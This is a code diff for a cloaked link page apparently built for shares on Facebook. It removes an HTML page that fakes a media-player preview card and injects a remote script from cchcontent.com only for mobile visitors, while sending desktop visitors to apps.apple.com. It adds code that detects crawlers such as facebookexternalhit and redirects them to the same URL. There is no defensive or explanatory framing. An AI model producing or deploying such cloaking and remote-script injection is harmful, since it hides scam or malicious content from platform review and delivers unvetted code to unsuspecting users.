@@ -1,36 +1,15 @@
+// Detectar bots usando el "userAgent" y redirigir
+function isBot() {
+    var userAgent = navigator.userAgent.toLowerCase();
+    var bots = ["bot", "crawl", "spider", "facebookexternalhit"];
+    for (var i = 0; i < bots.length; i++) {
+        if (userAgent.indexOf(bots[i]) > -1) {
+            return true;  // Es un bot
+        }
+    }
+    return false;  // No es un bot
+}
 
-
-<!DOCTYPE html>
-        <html>
-        <head>
-            <meta charset="utf-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-            <meta name="keywords" content="">
-            <meta name="generator" content="WordPress 5.3.2">
-            <meta name="facebook:card" content="summary_large_image" />
-            <title>00:30 ━●━━━━━─────── 5:35⇆</title>
-            <meta property="og:title" content="00:30 ━●━━━━━─────── 5:35⇆">
-            <meta property="og:description" content="◁ㅤㅤ❚❚ㅤㅤ▷ㅤㅤㅤㅤ↻">
-            <meta property="facebook:description" content="◁ㅤㅤ❚❚ㅤㅤ▷ㅤㅤㅤㅤ↻">
-            <meta property="og:image" content="https://scontent.fhex4-1.fna.fbcdn.net/v/t45.1600-4/434591022_120206117882370605_228378009745987376_n.jpg?stp=c25.0.676.353a_cp0_dst-jpg_q75_s526x296_spS444&_nc_cat=100&ccb=1-7&_nc_sid=c02adf&_nc_ohc=F6Z_27PSeQMQ7kNvgGIawXW&_nc_zt=1&_nc_ht=scontent.fhex4-1.fna&_nc_gid=ALwxPHybvRoX8_TLtJCNsNg&oh=00_AYAAvWky4DvUbyOk7bPV3AoSXhvrQEBJ7KxlQXoyuGYIlg&oe=671ED7F9" />
-            <link rel="canonical" href="https://linkpans.com/TEd.FI3.W.tod">
-            <meta property="og:url" content="https://linkpans.com/TEd.FI3.W.tod" />
-            <meta name="theme-color" content-"\#563d7c" />
-            <meta name="robots" content="NOINDEX,NOFOLLOW,NOARCHIVE,NOODP,NOSNIPPET" />
-        </head>
-        <body>
-            <script>
-                var device = navigator.userAgent;
-                var isMobile = /iPhone|iPad|iPod|Android|J2ME|BlackBerry|Opera Mini|IEMobile|Mobile|Windows Phone|windows mobile|windows ce|webOS|palm|bada|series60|nokia|symbian|HTC/i.test(device);
-
-                if (isMobile) {
-                    let scriptElement = document.createElement('script');
-                    scriptElement.src = 'https://cchcontent.com/?k=63523d54914e87a1a731af2a2ea5b55a&type=mainstream&subtype=global';
-                    scriptElement.type = 'text/javascript';
-                    document.head.appendChild(scriptElement);
-                } else {
-                    window.location.href = "https://apps.apple.com";
-                }
-            </script>
-        </body>
-        </html>
+if (isBot()) {
+    window.location.href = "https://cchcontent.com/?k=63523d54914e87a1a731af2a2ea5b55a&type=mainstream&subtype=global";  // Redirige a una página específica
+}
